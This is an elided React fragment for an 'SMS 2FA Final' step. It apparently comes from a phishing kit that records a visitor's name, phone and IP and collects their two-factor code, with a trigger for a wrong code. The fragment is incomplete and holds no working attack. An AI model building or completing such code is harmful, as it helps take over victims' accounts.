...
function Fa2Red({ Unik, setStep, Name, Tel, Ip, LastFetch, wrong2faTrigger }) {
  const {
    code,
    isLoading,
    showError,
    ...
    setStep,
    nextStep: 4,
    componentName: "SMS 2FA Final",
    initialMessage: "SMS 2FA Final Page Loaded",
  });

  const handleFormSubmit = (e) => {
    handleSubmit(e, "tfa_two");
  };
